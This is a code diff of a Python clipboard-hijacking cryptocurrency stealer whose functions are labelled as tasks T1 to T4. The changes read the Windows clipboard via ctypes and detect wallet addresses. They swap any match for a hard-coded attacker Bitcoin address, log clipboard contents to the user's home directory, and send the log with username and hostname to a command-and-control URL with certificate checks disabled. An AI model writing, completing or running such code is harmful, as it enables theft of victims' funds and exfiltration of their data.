@@ -1,37 +1,45 @@
 #!/usr/bin/env python3
-import sys, json, time, re, os, requests
+import sys
+import json
+import time
+import re
+import ctypes
+import os
+import socket
+import requests
 from typing import Dict, Any
-import win32clipboard
-
-def is_crypto_address(content: str) -> bool:
-    patterns = [
-        r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',  # Bitcoin
-        r'^0x[a-fA-F0-9]{40}$',                  # Ethereum
-        r'^L[a-zA-HJ-NP-Z0-9]{26,33}$',          # Litecoin
-        r'^X[1-9A-HJ-NP-Za-km-z]{33}$',          # Monero
-    ]
-    for pattern in patterns:
-        if re.match(pattern, content):
-            return True
-    return False
-
-def get_clipboard_content() -> str:
-    win32clipboard.OpenClipboard()
-    try:
-        content = win32clipboard.GetClipboardData()
-    except TypeError:
-        content = ''
-    finally:
-        win32clipboard.CloseClipboard()
-    return content
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
+        crypto_patterns = [
+            r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
+            r'^0x[a-fA-F0-9]{40}$',
+            r'^L[a-zA-HJ-NP-Z0-9]{26,33}$',
+            r'^[rX][a-zA-HJ-NP-Z0-9]{25,34}$'
+        ]
+
+        def get_clipboard_content() -> str:
+            CF_TEXT = 1
+            kernel32 = ctypes.windll.kernel32
+            user32 = ctypes.windll.user32
+
+            user32.OpenClipboard(0)
+            handle = user32.GetClipboardData(CF_TEXT)
+            data = ctypes.c_char_p(handle).value
+            user32.CloseClipboard()
+
+            return data.decode('utf-8') if data else ''
+
         content = get_clipboard_content()
-        is_crypto = is_crypto_address(content)
-        result = {'content': content, 'is_crypto': is_crypto}
+        is_crypto = any(re.match(pattern, content) for pattern in crypto_patterns)
+
+        result = {
+            'content': content,
+            'is_crypto': is_crypto
+        }
+
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -46,14 +54,15 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         content = input_data.get('content', '')
         is_crypto = input_data.get('is_crypto', False)
 
+        attacker_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+
         result = {
-            'replaced': False,
-            'original': content,
-            'replacement': ''
+            "replaced": False,
+            "original": content,
+            "replacement": content
         }
 
         if is_crypto:
-            attacker_address = "attacker_crypto_address"
             result['replacement'] = attacker_address
             result['replaced'] = True
 
@@ -66,24 +75,23 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
+    log_path = ''
     try:
         content = input_data.get('content', '')
         is_crypto = input_data.get('is_crypto', False)
 
-        log_file_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'clipboard_log.txt')
+        user_home = os.path.expanduser("~")
+        log_file_name = "clipboard_log.txt"
+        log_path = os.path.join(user_home, log_file_name)
 
-        with open(log_file_path, 'a') as log_file:
+        with open(log_path, 'a') as log_file:
             log_file.write(f"Crypto: {is_crypto}, Content: {content}\n")
 
-        result = {
-            'logged': True,
-            'log_file_path': log_file_path
-        }
-
+        result = {'log_path': log_path}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'logged': False, 'log_file_path': ''},
+        return {'success': False, 'data': {'log_path': log_path},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
@@ -91,38 +99,34 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        logged = input_data.get('logged', False)
-        log_file_path = input_data.get('log_file_path', '')
+        log_path = input_data.get('log_path', '')
 
-        if not logged or not log_file_path:
-            return {'success': False, 'data': {'exfiltrated': False},
-                    'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
-
-        with open(log_file_path, 'rb') as log_file:
+        with open(log_path, 'r') as log_file:
             log_content = log_file.read()
 
-        encrypted_payload = log_content.hex()
+        payload = {
+            'username': os.getlogin(),
+            'hostname': socket.gethostname(),
+            'log_content': log_content
+        }
 
-        c2_url = "https://192.168.142.249/api"
-        headers = {'Content-Type': 'application/json'}
-        payload = {'data': encrypted_payload}
+        c2_url = "https://192.168.79.141/api"
 
-        for attempt in range(2):
+        success = False
+        for attempt in range(3):
             try:
-                response = requests.post(c2_url, json=payload, headers=headers, timeout=15)
+                response = requests.post(c2_url, json=payload, timeout=10, verify=False)
                 if response.status_code == 200:
-                    return {'success': True, 'data': {'exfiltrated': True},
-                            'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
-            except requests.RequestException:
-                if attempt == 1:
-                    return {'success': False, 'data': {'exfiltrated': False},
-                            'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
+                    success = True
+                    break
+            except (requests.ConnectionError, requests.Timeout):
+                time.sleep(5)
 
-        return {'success': False, 'data': {'exfiltrated': False},
+        result = {'success': success}
+        return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
-                'data': {'exfiltrated': False},
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
